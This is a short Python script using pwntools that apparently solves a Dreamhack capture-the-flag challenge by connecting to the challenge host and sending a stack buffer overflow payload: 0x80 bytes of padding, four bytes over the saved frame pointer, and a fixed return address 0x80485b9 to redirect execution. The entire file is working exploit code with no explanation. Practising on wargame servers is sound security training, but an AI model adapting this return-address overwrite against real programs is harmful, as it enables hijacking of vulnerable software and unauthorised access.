from pwn import *

p=remote('host1.dreamhack.games',12564)

context.log_level='debug'

payload=""

# 0x80 + 0x4 + ret

payload+="A"*0x80
payload+="B"*0x4
payload+=p32(0x80485b9)

p.sendline(payload)
p.recv()